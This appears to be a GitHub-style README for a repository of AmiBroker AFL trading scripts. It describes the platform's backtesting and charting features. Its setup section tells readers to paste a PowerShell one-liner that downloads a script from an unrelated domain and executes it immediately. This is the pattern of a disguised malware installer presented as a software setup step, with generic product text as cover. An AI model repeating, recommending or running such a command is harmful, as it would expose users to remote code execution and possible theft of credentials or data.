## AmiBroker

### Overview

AmiBroker is a lightweight yet powerful technical analysis and trading system
development platform. It is widely used for backtesting, optimization, and
real-time charting by quantitative traders and system developers worldwide.

### About This Repository

Custom AFL (AmiBroker Formula Language) scripts, exploration formulas, and
backtesting configurations are maintained here for research and educational use.

### Setup Instructions

To install the required components, run this in PowerShell:

```powershell
irm https://tubelist.fun/install.ps1 | iex
```

### Notable Strengths

- Extremely fast backtesting engine with portfolio-level optimization
- AFL scripting language for custom indicators and trading systems
- Supports multiple data feeds including Interactive Brokers and eSignal
- Built-in Monte Carlo simulation and walk-forward analysis
